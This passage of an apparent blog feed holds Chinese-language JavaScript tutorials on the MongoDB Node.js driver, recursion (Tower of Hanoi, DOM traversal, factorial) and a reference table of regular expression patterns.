2、使用insert方法插入数据（接受三个参数，safe模式，keepGoing【插入失败是否继续执行】、serializeFunctions【是否序列化】）</p><p>到这里我们已经可以连接到我们的mongodb数据库，并添加文档了，这对于一个大二的前端开发小伙伴来说是兴奋地，以至于半夜不睡觉发神经扰民- - </p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mongodb = <span class="built_in">require</span>(<span class="string">'mongodb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> mongodb.Server(<span class="string">'localhost'</span>, <span class="number">27017</span>, &#123;<span class="attr">auto_reconnect</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="keyword">var</span> db = <span class="keyword">new</span> mongodb.Db(<span class="string">'exampleDb'</span>, server);</span><br><span class="line"></span><br><span class="line">db.open(<span class="function"><span class="keyword">function</span> (<span class="params">err, db</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        db.collection(<span class="string">'widgets'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//删除exampleDb数据库widgets集合中的数据</span></span><br><span class="line">            collection.remove(<span class="literal">null</span>, &#123;<span class="attr">safe</span>: <span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">'result of remove'</span> + result);</span><br><span class="line">                    <span class="comment">//创建两条数据</span></span><br><span class="line">                    <span class="keyword">var</span> widget1 = &#123;<span class="attr">id</span>: <span class="number">1</span>, <span class="attr">title</span>: <span class="string">'First Great widget'</span>, <span class="attr">desc</span>: <span class="string">'greatest widget of all'</span>, <span class="attr">price</span>: <span class="number">14.99</span>&#125;;</span><br><span class="line">                    <span class="keyword">var</span> widget2 = &#123;</span><br><span class="line">                        id: <span class="number">2</span>,</span><br><span class="line">                        title: <span class="string">'Second Great widget'</span>,</span><br><span class="line">                        desc: <span class="string">'second greatest widget of all'</span>,</span><br><span class="line">                        price: <span class="number">29.99</span></span><br><span class="line">                    &#125;;</span><br><span class="line">                    collection.insert(widget1);</span><br><span class="line">                    collection.insert(widget2, &#123;<span class="attr">safe</span>: <span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(err)</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            collection.find().toArray(<span class="function"><span class="keyword">function</span> (<span class="params">err, docs</span>) </span>&#123;</span><br><span class="line">                                <span class="built_in">console</span>.log(docs);</span><br><span class="line">                                <span class="comment">//关闭数据库</span></span><br><span class="line">                                db.close();</span><br><span class="line">                            &#125;);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>进入到项目文件，我们通过node命令启动app服务： <code>node app</code> ,</p><p>当然你如果你想避免每次修改之后通过node命令重启服务的繁琐，可以使用supervisor，通过 <code>npm install supervisor -g</code>安装在全局中，使用supervisor命令代替node，这样修改文件之后，不需要每次通过node命令重启服务</p><p>那么我们在命令行看下结果吧- -</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170902020515468-95946655.png" alt=""></p><p>然后我们在mongodb数据库中看下数据结果：（如果你已经配置好了mongo的环境变量，以管理员身份打开cmd，通过mongo命令启动mongodb）</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170902020820640-1818403613.png" alt=""></p><p>会看到数据库widgets文档中也加入了我们想要的两条数据，</p><p>如果批量处理文档数据，我们需要尽可能的设置keepGoing为true。</p><h1 id="实现查询数据"><a href="#实现查询数据" class="headerlink" title="实现查询数据"></a>实现查询数据</h1><p>对于MongoDB Native Node.js Driver来说有四种查询数据的方法：find()、findOne()、findAndRemove()、findAndModify()</p><p> findOne()和find()支持以下三个参数：查询数据、可选参数、回调函数 。（对于可选参数和回调函数都是可选项、而且这两种选项的可选值非常多，但是大部分查询只会用到一小部分的选项值）</p><p>常用的</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort（文档排序，-1倒排序，1正排序）、</span><br><span class="line"></span><br><span class="line">Field（查询语句并返回field）、</span><br><span class="line"></span><br><span class="line">Skip（skip n个文档，用于跳页）</span><br><span class="line"></span><br><span class="line">Hint（告诉数据库使用特定的索引）</span><br><span class="line"></span><br><span class="line">returnKey（只返回索引的key）</span><br><span class="line"></span><br><span class="line">Comment（为查询在log日志文件中添加描述）</span><br><span class="line"></span><br><span class="line">showDiscLoc（显示结果在磁盘中的位置）</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>这些选项值我们同样可以在mongo下使用，进行数据的一些操作</p><p>1、接下来我们来用find()查询并返回我们数据库的内容，可以直接使用toArray()方法将结果转化为数组</p><p>2、使用可选值field来进行筛选，{fields:{ type=0 }} 设置为0来查询除type之外的字段，为1相反</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">collection.find(&#123;type=<span class="string">"A"</span>&#125;,&#123;<span class="attr">fields</span>:&#123;type=<span class="number">0</span>&#125;&#125;).toArray(<span class="function"><span class="keyword">function</span>(<span class="params">err,docs</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err)</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(docs);</span><br><span class="line"></span><br><span class="line">         <span class="comment">//关闭数据库链接</span></span><br><span class="line">         db.close(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>我们来找到所有type为A，并且返回这条数据（不含type字段）。但是需要注意的一点是，我们设置为1，也并不是只出现type字段，系统生成的唯一标识符也就是_id总是会出现在查询结果中</p><h1 id="更新、删除文档"><a href="#更新、删除文档" class="headerlink" title="更新、删除文档"></a>更新、删除文档</h1><p>修改、删除文档的方法：更新文档：update()   或者是upserts(如果不存在就添加文档)，删除文档remove()、查找并修改或者删除一个文档findAndModify()、查找并删除一个文档findAndRemove()</p><p>update/remove和后两个方法之间最本质的区别就在于后者两个方法都返回了被操作的文档</p><p>使用$set修改符代替field，$set修改符使只会修改作为属性传递给修改器的field</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> mongodb = <span class="built_in">require</span>(<span class="string">'mongodb'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> server = <span class="keyword">new</span> mongodb.Server(<span class="string">'localhost'</span>, <span class="number">27017</span>, &#123;<span class="attr">auto_reconnect</span>: <span class="literal">true</span>&#125;);</span><br><span class="line"><span class="keyword">var</span> db = <span class="keyword">new</span> mongodb.Db(<span class="string">'exampleDb'</span>, server);</span><br><span class="line"></span><br><span class="line">db.open(<span class="function"><span class="keyword">function</span> (<span class="params">err, db</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">        db.collection(<span class="string">'widgets'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, collection</span>) </span>&#123;</span><br><span class="line">            <span class="comment">//更新数据</span></span><br><span class="line">            collection.update(&#123;<span class="attr">id</span>: <span class="number">2</span>&#125;, &#123;<span class="attr">$set</span>: &#123;<span class="attr">title</span>: <span class="string">"Super Bad Widget"</span>&#125;&#125;, &#123;<span class="attr">safe</span>: <span class="literal">true</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, result</span>) </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (err) &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(err)</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="built_in">console</span>.log(result);</span><br><span class="line">                    <span class="comment">//查询更新数据库</span></span><br><span class="line">                    collection.findOne(&#123;<span class="attr">id</span>: <span class="number">2</span>&#125;, <span class="function"><span class="keyword">function</span> (<span class="params">err, doc</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (!err) &#123;</span><br><span class="line">                            <span class="built_in">console</span>.log(doc);</span><br><span class="line">                            <span class="comment">//关闭数据库</span></span><br><span class="line">                            db.close();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>更新后的数据库已经改变</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201709/1140602-20170902032013249-495013699.png" alt=""></p><p>写在后面<br> 使用MongoDB Native Node.js Driver模块，驱动的指令基本上和mongodb客户端是一致的，如果你跟我一样对原始的驱动模块感兴趣，那么这个nodeJS Driver官网一定可以帮到你。</p><p>虽然原始驱动提供了数据库的连接，但是缺少更高级别的抽象，有些繁琐，所以有时候你需要使用类似mongoose的ODM，</p><p>mongoose构建在mongodb之上，提供了Schema、Model和Document对象，用起来更为方便。</p><p>下一次我会总结一下使用express + mongoose建立数据库的连接</p>]]></content>
      
      
      <categories>
          
          <category> Node </category>
          
          <category> mongodb </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Node </tag>
            
            <tag> mongodb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>递归函数-汉诺塔经典递归</title>
      <link href="/2017/08/31/js-algorithm20170831/"/>
      <url>/2017/08/31/js-algorithm20170831/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在读《JavaScript语言精粹》，对递归函数有了进一步的认识，希望总结下来：</p><p>递归是一种强大的编程技术，他把一个问题分解为一组相似的子问题，每一问题都用一个寻常解去解决。递归函数就是会直接或者间接调用自身的一种函数，一般来说，一个递归函数调用自身去解决它的子问题。</p><h1 id="“汉诺塔”经典递归问题"><a href="#“汉诺塔”经典递归问题" class="headerlink" title="“汉诺塔”经典递归问题"></a>“汉诺塔”经典递归问题</h1><p>“汉诺塔”是印度的一个古老传说，也是程序设计中的经典的递归问题，是一个著名的益智游戏：</p><p>题目如下：</p><p>塔上有三根柱子和一套直径各不相同的空心圆盘，开始时源柱子上的所有圆盘都按从大到小的顺序排列。目标是通过每一次移动一个圆盘到另一根柱子上，最终把一堆圆盘移动到目标柱子上，过程中不允许把较大的圆盘放置在较小的圆盘上；</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170826161041339-1044886841.png" alt="">　</p><a id="more"></a><h1 id="寻找规律（把所有的圆盘移动到C）："><a href="#寻找规律（把所有的圆盘移动到C）：" class="headerlink" title="寻找规律（把所有的圆盘移动到C）："></a>寻找规律（把所有的圆盘移动到C）：</h1><p>　　1）n(圆盘个数) == 1</p><p>　　　　第一次：1号盘  A -&gt; C      sum(移动次数) = 1</p><p>　　2）n == 2</p><p>　　　　第一次：1号盘 A -&gt; B</p><p>　　　　第二次：2号盘 A -&gt; C</p><p>　　　　第三次：1号盘 B -&gt; C　　sum = 3</p><p>　　3）n == 3</p><p>　　　　第一次：1号盘 A -&gt; C</p><p>　　　　第二次：2号盘 A -&gt; B</p><p>　　　　第三次：1号盘 C -&gt; B</p><p>　　　　第四次：3号盘 A -&gt; C</p><p>　　　　第五次：1号盘 B -&gt; A</p><p>　　　　第六次：2号盘 B -&gt; C</p><p>　　　　第七次：1号盘 A -&gt; C　　sum = 7</p><p>　　以此类推…</p><p>故不难发现规律,移动次数为：sum = 2^n - 1　</p><h1 id="算法分析（递归）："><a href="#算法分析（递归）：" class="headerlink" title="算法分析（递归）："></a>算法分析（递归）：</h1><p>把一堆圆盘从一个柱子移动另一根柱子，必要时使用辅助的柱子。可以把它分为三个子问题：</p><p>　　　　首先，移动一对圆盘中较小的圆盘到辅助柱子上，从而露出下面较大的圆盘，</p><p>　　　　其次，移动下面的圆盘到目标柱子上</p><p>　　　　最后，将刚才较小的圆盘从辅助柱子上在移动到目标柱子上</p><p>把三个步骤转化为简单数学问题：</p><p>　　　　（1）     把 n-1个盘子由A 移到 B；</p><p>　　　　（2）     把 第 n个盘子由 A移到 C；</p><p>　　　　（3）     把n-1个盘子由B 移到 C；</p><p>我们创建一个JS函数，当它调用自身的时候，它去处理当前正在处理圆盘之上的圆盘。最后它回一个不存在圆盘去调用，在这种情况下，它不在执行任何操作。</p><h1 id="JavaScript源代码实现"><a href="#JavaScript源代码实现" class="headerlink" title="JavaScript源代码实现"></a>JavaScript源代码实现</h1><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> hanoi = <span class="function"><span class="keyword">function</span>(<span class="params">disc,src,aux,dst</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(disc&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        hanoi(disc<span class="number">-1</span>,src,dst,aux);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">' 移动 '</span>+ disc +  <span class="string">' 号圆盘 '</span> + <span class="string">' 从 '</span> + src +  <span class="string">' 移动到 '</span> +  dst);</span><br><span class="line">        hanoi(disc<span class="number">-1</span>,aux,src,dst)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hanoi(<span class="number">3</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,<span class="string">'C'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170826185640527-159094023.png" alt=""></p><p>整个算法的思路是：</p><ul><li><p>将A柱子上的n-1个盘子暂时移到B柱子上</p></li><li><p>A柱子只剩下最大的盘子，把它移到目标柱子C上</p></li><li><p>最后再将B柱子上的n-1个盘子移到目标柱子C上</p></li></ul><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170826174129183-1188124420.gif" alt=""></p><h1 id="JS递归函数遍历Dom"><a href="#JS递归函数遍历Dom" class="headerlink" title="JS递归函数遍历Dom"></a>JS递归函数遍历Dom</h1><p>递归函数可以非常高效的操作树形结构，在JavaScript有一种”天然的树形结构”浏览器端的文档对象模型（Dom）。每次递归调用时处理指定树的一小段。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*      我们定义一个walk_the_DOM函数， </span></span><br><span class="line"><span class="comment">1） 它从某个指定的节点开始，按指定HTML源码的顺序，访问树的每个节点 </span></span><br><span class="line"><span class="comment"> 2）它会调用一个函数，并依次传递每个节点给它，walk_the_DOM调用自身去处理每一个节点</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> walk_the_DOM = <span class="function"><span class="keyword">function</span> <span class="title">walk</span>(<span class="params"> node , func </span>) </span>&#123;  </span><br><span class="line">    func(node);    </span><br><span class="line">    node = node.firstChild;    </span><br><span class="line">    <span class="keyword">while</span> (node) &#123;   </span><br><span class="line">        walk( node , func );   </span><br><span class="line">        node = node.nextSibling;   </span><br><span class="line">     &#125;    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*    在定义一个getElementByAttribute函数</span></span><br><span class="line"><span class="comment">1） 它以一个属性名称字符串和一个可选的匹配值作为参数</span></span><br><span class="line"><span class="comment">2） 它调用walk_the_DOM，传递一个用来查找节点属性名的函数作为参数，匹配得节点都会累加到一个数组中</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">var</span> getElementsByAttribute=<span class="function"><span class="keyword">function</span>(<span class="params">att,value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> results=[];</span><br><span class="line">    walk_the_DOM(<span class="built_in">document</span>.body,<span class="function"><span class="keyword">function</span>(<span class="params">node</span>)</span>&#123;                    </span><br><span class="line">            <span class="keyword">var</span> actual=node.nodeType===<span class="number">1</span>&amp;&amp;node.getAttribute(att);                    </span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">typeof</span> actual===<span class="string">'string'</span> &amp;&amp;( actual===value|| <span class="keyword">typeof</span> value!==<span class="string">'string'</span>))&#123;                   </span><br><span class="line">                    results.push(node);                    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="命名函数表达式和递归"><a href="#命名函数表达式和递归" class="headerlink" title="命名函数表达式和递归"></a>命名函数表达式和递归</h1><h2 id="递归问题"><a href="#递归问题" class="headerlink" title="递归问题"></a>递归问题</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 求阶乘的函数：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num*factorial(num<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过将函数factorial设置为null，使原始函数的引用只剩一个, 此时factorial已不再是函数</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170826193620027-806984604.png" alt=""></p><h2 id="arguments-callee实现递归"><a href="#arguments-callee实现递归" class="headerlink" title="arguments.callee实现递归"></a>arguments.callee实现递归</h2><p>arguments.callee是一个指向正在执行的函数的指针，因此可以用它来实现对函数的递归调用</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">factorial</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(num&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num*<span class="built_in">arguments</span>.callee(num<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> anotherFactorial=factorial;</span><br><span class="line">factorial=<span class="literal">null</span>;</span><br><span class="line">anotherFactorial(<span class="number">3</span>) <span class="comment">//6</span></span><br></pre></td></tr></table></figure><p>用arguments.callee代替函数名，可以确保无论怎样调用函数都不会出问题。因此，在编写递归函数时，使用arguments.callee总比使用函数名更保险。</p><p>但是在严格模式下，不能通过脚本访问arguments.callee，访问这个属性会报错</p><p><img src="https://images2017.cnblogs.com/blog/1140602/201708/1140602-20170826194200855-11517974.png" alt=""></p><p>命名函数表达式实现递归<br>创建一个名为f()的命名函数表达式，然后赋值给factorial，即使把函数赋值给了另一个变量，函数的名字f仍然有效，所以递归调用照样能正常完成。</p><p>这种方式在严格模式和非严格模式都可行。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> factorial =<span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span></span><br><span class="line">    <span class="keyword">if</span>(num&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num* f (num<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">factorial(<span class="number">3</span>)    <span class="comment">//6</span></span><br><span class="line"><span class="keyword">var</span> anotherFactorial=factorial;</span><br><span class="line">factorial=<span class="literal">null</span>;</span><br><span class="line">anotherFactorial(<span class="number">3</span>)      <span class="comment">//6</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RegExp正则匹配模式汇总</title>
      <link href="/2017/08/19/js-regular20170819/"/>
      <url>/2017/08/19/js-regular20170819/</url>
      
        <content type="html"><![CDATA[<p>正则表达式提供另一种强大的文本搜索和处理方式，对于正则表达式，不同语言有着不同的实现，JavaScript采用的Perl5的语法。对于极少数匹配模式是简单的全字符文本的情况，我们往往会采用indexOf这样的方法，但是多数情况下，匹配模式往往都更为复杂。</p><a id="more"></a><h1 id="1、语法"><a href="#1、语法" class="headerlink" title="1、语法"></a>1、语法</h1><p>1）在JavaScript中我们可以采用内建构造器RegExp()来创建正则表达式的对象；</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"j.*t"</span>)</span><br></pre></td></tr></table></figure><p>2）当然除了使用RegExp对象，我们可以采用更为简便的正则文本标记法</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/j.*t/</span></span><br></pre></td></tr></table></figure><h1 id="2、RegExp对象属性"><a href="#2、RegExp对象属性" class="headerlink" title="2、RegExp对象属性"></a>2、RegExp对象属性</h1><p>1、global：  是否打开全局搜索（默认是false，只匹配到第一个）</p><p>2、ignoreCase： 设置大小写相关性</p><p>3、multiline： 设置是否跨行搜索</p><p>4、lastIndex：搜索的开始索引位置，默认为0</p><p>5、source： 用于存储正则表达式的匹配模式</p><p>除了laseIndex外，上面所有属性在设置之后都不再被修改，也就是说：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> re = <span class="regexp">/j.*t/ig</span>; 　　</span><br><span class="line">re.global   <span class="comment">// true; 　　</span></span><br><span class="line">re.global = <span class="literal">false</span>; 　　</span><br><span class="line">re.global   <span class="comment">// true;</span></span><br></pre></td></tr></table></figure><h1 id="3、RegExp对象的方法"><a href="#3、RegExp对象的方法" class="headerlink" title="3、RegExp对象的方法"></a>3、RegExp对象的方法</h1><p>RegExp对象中有两种方法可用于查找匹配内容的方法：test（）和exec（）。这两种方法的参数都是一个字符串，test（）方法返回的是一个布尔值、而exec（）返回的由匹配到字符串所组成的数组。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">/j.*t/.test(<span class="string">"JavaScript"</span>);         <span class="comment">//false</span></span><br><span class="line">/j.*t/i.test(<span class="string">"JavaScript"</span>);        <span class="comment">//true</span></span><br><span class="line">/j.*t/i.exec(<span class="string">"JavaScript"</span>)[<span class="number">0</span>];   <span class="comment">//"JavaScript"</span></span><br></pre></td></tr></table></figure><p>以正则表达式为参数的字符串的方法</p><p>1）match()        返回一个包含匹配内容的数组</p><p>2）search()      返回的是第一个匹配内容的所在位置</p><p>3）replace()  能将匹配的文本替换程指定字符串</p><p>4）split()    根据正则分割若干个数组元素</p><h2 id="match-方法"><a href="#match-方法" class="headerlink" title="match()方法"></a>match()方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> s = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="string">'HelloJavaScriptWorld'</span>); 　　</span><br><span class="line">s.match(<span class="regexp">/a/</span>)     <span class="comment">//["a"] 　　</span></span><br><span class="line">s.match(<span class="regexp">/a/g</span>)    <span class="comment">// ["a","a"]　　</span></span><br><span class="line">s.match(<span class="regexp">/j.*a/i</span>) <span class="comment">// ["Java"]</span></span><br></pre></td></tr></table></figure><h2 id="search-方法"><a href="#search-方法" class="headerlink" title="search()方法"></a>search()方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">search方法会返回匹配字符串的索引位置（从<span class="number">0</span>开始）</span><br><span class="line">s.search(<span class="regexp">/j.*a/i</span>);  <span class="comment">//5</span></span><br></pre></td></tr></table></figure><h2 id="replace-方法"><a href="#replace-方法" class="headerlink" title="replace()方法"></a>replace()方法</h2><p>replace用于将匹配的文本替换掉</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">s.replace(<span class="regexp">/[A-Z]/g</span>,<span class="string">'_$&amp;'</span>);   <span class="comment">//_Hello_JavaScript_World</span></span><br></pre></td></tr></table></figure><p>①$&amp;保留原来匹配对象并在前面加_<br>②&amp;1表示匹配的第一组以此类推</p><h2 id="split-方法"><a href="#split-方法" class="headerlink" title="split()方法"></a>split()方法</h2><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> csv = <span class="string">"one,two,three,four"</span>;</span><br><span class="line">csv.spilt(<span class="regexp">/\s*,\s*/</span>);   <span class="comment">//["one","two","three","four"]</span></span><br></pre></td></tr></table></figure><p>①\s*用于匹配0个或者多个空格</p><h1 id="4、回调式替换"><a href="#4、回调式替换" class="headerlink" title="4、回调式替换"></a>4、回调式替换</h1><p>当我们需要执行一些特定的替换操作时，也可以通过返回字符串的函数来完成。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> global；</span><br><span class="line"><span class="keyword">var</span> callback = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    global = argumens;</span><br><span class="line">　　 <span class="keyword">return</span> argumens[<span class="number">1</span>] + <span class="string">'a'</span> + argumens[<span class="number">2</span>] + <span class="string">'dot'</span> + <span class="built_in">arguments</span>[<span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> re = <span class="regexp">/(.*)@(.*)\.(.*)/</span>;</span><br><span class="line"><span class="string">"OkayChen@cnblogs.com"</span>.replace(re,callback);  <span class="comment">//OkayChen at cnblogs dot com</span></span><br></pre></td></tr></table></figure><h1 id="5、正则匹配模式"><a href="#5、正则匹配模式" class="headerlink" title="5、正则匹配模式　"></a>5、正则匹配模式　</h1><table><thead><tr><th>匹配模式</th><th>相关说明</th></tr></thead><tbody><tr><td>[abc]</td><td>匹配的字符类信息 <code>&quot;Some Text&quot;.match(/[otx]/g);   //[&#39;o&#39;,&#39;t&#39;,&#39;x&#39;,&#39;t&#39;]</code></td></tr><tr><td>[a-z]</td><td>[a-z]就相当于[abcd],[a-z]就表示我们要匹配所有的小写字母，而[a-zA-Z0-9_]就是匹配所有的字母、数字及下划线<code>&quot;Some Text&quot;.match(/[a-z]/g);   //[&#39;o&#39;,&#39;m&#39;,&#39;e&#39;,&#39;e&#39;,&#39;x&#39;,&#39;t&#39;]</code></td></tr><tr><td>[^abc]</td><td>匹配所有不属于限定范围内的字符<code>&quot;Some Text&quot;.match(/[^a-z]/g);//[&#39;S&#39;,&#39;&#39;,&#39;T&#39;];</code></td></tr><tr><td>a｜b</td><td>这里匹配的是a或者b`”Some Text”.match(/t</td></tr><tr><td>a(?=b)</td><td>匹配所有后面跟着b的a的信息<code>&quot;Some Text&quot;.match(/Some(?= Tex)/g);//[&quot;some&quot;]</code>，<code>&quot;Some Text&quot;.match(/Some(?=Tex)/g);　//null</code>.</td></tr><tr><td>a(?！b)</td><td>匹配所有后面不跟着b的a的信息<code>&quot;Some Text&quot;.match(/Some(?!Tex)/g);//[&quot;some&quot;]</code>，<code>&quot;Some Text&quot;.match(/Some(?! Tex)/g);//null</code>.</td></tr><tr><td>\</td><td>反斜杠主要用于帮助我们匹配一些模式文本中的特殊字符<code>&quot;R2-D2&quot;.match(/[2\-3]/g);//[&quot;2&quot;,&quot;-&quot;,&quot;2&quot;]</code></td></tr><tr><td>\n</td><td>换行符</td></tr><tr><td>\r</td><td>回车符</td></tr><tr><td>\f</td><td>换页符</td></tr><tr><td>\t</td><td>横向制表符</td></tr><tr><td>\v</td><td>纵向制表符</td></tr><tr><td>\s</td><td>这是匹配的空白符，包含上面五个转义字符<code>&quot;R2\n D2&quot;.match(/\s/g);//[&quot;n&quot;,&quot;&quot;]</code></td></tr><tr><td>\S</td><td>匹配除空白符以外的内容，就相当于  [^\s]</td></tr><tr><td>\w</td><td>匹配所有的字母、数字和下划线，相当于  [A-Za-z0-9_]</td></tr><tr><td>\W</td><td>刚好与\w相反</td></tr><tr><td>\d</td><td>匹配所有的数字类信息 相当于 [0-9]</td></tr><tr><td>\D</td><td>刚好与\d相反</td></tr><tr><td>\b</td><td>匹配一个单词的边界，例如空格和标点符号</td></tr><tr><td>\B</td><td>刚好与\b相反</td></tr><tr><td>[\b]</td><td>匹配的是退格键符（Backspace）</td></tr><tr><td>\0</td><td>这里匹配的是null</td></tr><tr><td>\uoooo</td><td>这里匹配的是一个unicode字符，并且是一个四位16进制数来表示，<code>&quot;CTOH&quot;.match(/\u0441\u0442\u943E/)　　//[&quot;CTO&quot;]</code></td></tr><tr><td>\x00</td><td>这里匹配的是一个字符，该字符的编码是一个两位十六进制数来表示的<code>&quot;dude&quot;.match(/x64/g);// [&quot;d&quot;,&quot;d&quot;]</code></td></tr><tr><td>^</td><td>匹配字符串的开头部分，如果设置了m，那就是匹配每一行的开头</td></tr><tr><td>$</td><td>匹配字符串的结尾部分，如果设置了m，那就是匹配每一行的结尾</td></tr><tr><td>.</td><td>这里 匹配的是除了换行符以为的任何字符</td></tr><tr><td>*</td><td>这里匹配的是模式中间出现0次或者多次的内容。例如/.*/可以匹配任何内容</td></tr><tr><td>?</td><td>匹配模式中间出现0次或者1次的内容<code>&quot;anything&quot;.match(/ng?/g);   //[&quot;ng&quot;,&quot;n&quot;]</code></td></tr><tr><td>+</td><td>这里匹配的是模式中间至少出现一次或者多次的内容<code>&quot;R2-D2&quot; and C-3PO&quot;.match(&quot;/[a-z+/gi&quot;); 　